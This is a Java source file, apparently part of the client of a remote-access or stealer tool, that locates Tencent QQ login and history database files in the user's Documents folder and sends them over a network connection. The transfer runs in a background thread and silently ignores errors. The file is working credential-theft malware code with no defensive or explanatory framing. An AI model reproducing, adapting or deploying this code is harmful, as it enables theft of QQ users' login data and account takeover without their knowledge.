package client.utils.system;

import client.connection.ClientConnection;
import client.connection.ID;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;

public class QQUtil {

    public static int getQQVersion() {
        try {
            File file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\All Users\\QQ\\Registry2.0.db");
            if (file.exists())
                return ID.IS_QQ_OLD();

            file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\nt_qq\\global\\Registry.db");
            if (file.exists())
                return ID.IS_QQ_NT();

            return ID.NO_QQ();
        }catch (Exception e){
            return ID.NO_QQ();
        }
    }
    public static byte[] getQQLoginData() {
        try {
            File file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\All Users\\QQ\\Registry2.0.db");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\nt_qq\\global\\qq_db\\Registry.db");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            return "File does not exist".getBytes();
        }catch (Exception e){
            return e.getMessage().getBytes();
        }
    }

    public static byte[] getQQLoginHistory() {
        try {
            File file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\All Users\\QQ\\History.db");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\nt_qq\\global\\qq_db\\login.db");
            if (file.exists())
                return Files.readAllBytes(file.toPath());

            return "File does not exist".getBytes();
        }catch (Exception e){
            return e.getMessage().getBytes();
        }
    }

    public static byte[] getOldQQLoginData() throws IOException {
        File file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files\\All Users\\QQ\\Registry.db");
        if (file.exists())
            return Files.readAllBytes(file.toPath());
        return "File does not exist".getBytes();
    }



    public static void sendQQLoginData(ClientConnection clientConnection) {
        new Thread(()->{
            try {
                int qqVersion = getQQVersion();
                clientConnection.sendHead(qqVersion);
                if (qqVersion == ID.NO_QQ())
                    return;
                clientConnection.sendHead(ID.QQ_DATA());
                clientConnection.sendData(getQQLoginData());
                clientConnection.sendData(getQQLoginHistory());
                if (qqVersion == ID.IS_QQ_OLD())
                    clientConnection.sendData(getOldQQLoginData());
            }catch (Exception ignored){}
        }).start();
    }
}
